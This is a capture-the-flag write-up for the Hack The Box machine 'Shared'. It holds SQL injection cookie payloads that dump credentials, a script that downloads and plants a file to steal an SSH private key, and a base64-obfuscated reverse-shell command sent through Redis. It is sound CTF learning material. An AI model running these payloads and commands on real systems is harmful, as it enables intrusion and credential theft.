Hack the box:Shared

***Enumeration***

Nmap scan
```
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
443/tcp open  ssl/http nginx 1.18
```
Domain && subdomain

**http://shared.htb**

**http://checkout.shared.htb**

vuln in cookie

cookie **"custom_cart=%7B%2253GG2EF8%22%3A%223%22%7D"**

decode cookie value **"custom_cart={"53GG2EF8":"3"}"**

***FootHold***

union based blind sql injection

referal **https://infosecwriteups.com/healing-blind-injections-df30b9e0e06f**


payload
```
{"53GG2EF8'AND 1=2 UNION SELECT 1,(user()),3-- -":"3"}
```
database username **checkout@localhost**

Database Name Enumeration
```
{"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -":"3"}
```
**information_schema,checkout**

Tables from checkout;
```
{"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'checkout'),3-- -":"3"}
```
**user,product**

Columns from user;
```
{"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(TABLE_NAME,COLUMN_NAME) from INFORMATION_SCHEMA.COlUMNS where TABLE_SCHEMA = 'checkout'),3-- -":"3"}
```
**user.id,user.username,user.password,product.id,product.code,prodcut.price**

username and password from user
```
{"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(username) from checkout.user),3-- -":"3"}
```
```
{"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(password) from checkout.user),3-- -":"3"}
```
**james_mason:fc895d4eddc2fc12f995e18c865cf273**

crack the hash using hashcat

ssh cred => james_mason:Soleil101

connect to SSH as james_mason

***Low privilege user james_mason to dan_smith***

their is a cronjob running to use ipython 

recent cve of ipython **https://github.com/advisories/GHSA-pq7m-3gw7-gq5x**

for exploiting the ipython we create a shell script to automate some purpose

os.py
```python 
import os

os.system("cat /home/dan_smith/.ssh/id_rsa > /tmp/id_rsa")

```

script.sh
```bash
#!/usr/bin/bash

mkdir -p /opt/scripts_review/profile_default
chmod 777 /opt/scripts_review/profile_default
mkdir -p /opt/scripts_review/profile_default/startup
chmod 777 /opt/scripts_review/profile_default/startup
wget http://10.10.16.19/os.py -O /opt/scripts_review/profile_default/startup/os.py
chmod 777 /opt/scripts_review/profile_default/startup/os.py
```

for execute the script
```
wget http://10.10.16.19/script.sh && chmod +x script.sh && bash script.sh
```

***Privilege escalation***

The server has running redis as root but we cannot connect the server without creds so we need to
find the cred to access the server

let's check the user's and groups related files
```
find / -group sysadmin 2>/dev/null
```
we found a intersting excutable file in /usr/local/bin

It is a excutable binary to connect the redis server as localy and automaticly login using the auth creds and run a simple redis command info and get the result to us

from their we know in the excutable has the auth cred. copy the binary to our local machine
start anlayzing it
```
scp -i file.key dan_smith@ip:/usr/local/bin/redis_connector_dev redis_connector_dev
```
run the binary on localy and setup a netcat listion on port 6379
```
nc -lv localhost 9379
```
after runing the binary we get the connection on netcat and got the creds

redis => **"auth:F2WHqJUz2WEz=Gqq"**

after gain access the redis server using the auth creds we create a custom module for runing the os commands
referal https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

**Exploit**
```
auth F2WHqJUz2WEz=Gqq

MODULE  LOAD /dev/shm/redis/module.so

module list

system.exec "cat /root/root"

system.exec "echo -n 'YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE2LjEwLzkwMDEgICAwPiYxIA==' | base64 -d |bash"
```